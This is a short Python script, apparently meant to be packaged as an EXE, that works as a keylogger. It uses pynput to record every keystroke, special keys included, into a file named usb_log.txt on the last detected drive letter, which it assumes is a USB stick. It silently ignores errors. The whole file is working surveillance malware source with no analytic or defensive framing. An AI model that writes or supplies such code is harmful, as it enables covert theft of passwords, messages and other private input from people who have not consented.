from pynput import keyboard
import os

# Automatically detect the USB drive (Assumes it's the last mounted drive)
def get_usb_drive():
    drives = [d + ":\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(d + ":\\")]
    return drives[-1] if drives else None  # Selects the last available drive

usb_drive = get_usb_drive()

# Ensure USB is present
if usb_drive:
    log_file = os.path.join(usb_drive, "usb_log.txt")  # Log file in USB
else:
    print("No USB detected! Exiting...")
    exit()

# Capture and log keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f' [{key}] ')  # Logs special keys (Shift, Enter, etc.)
    except:
        pass  # Ignore errors

# Start keylogger (only runs while the EXE is open)
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
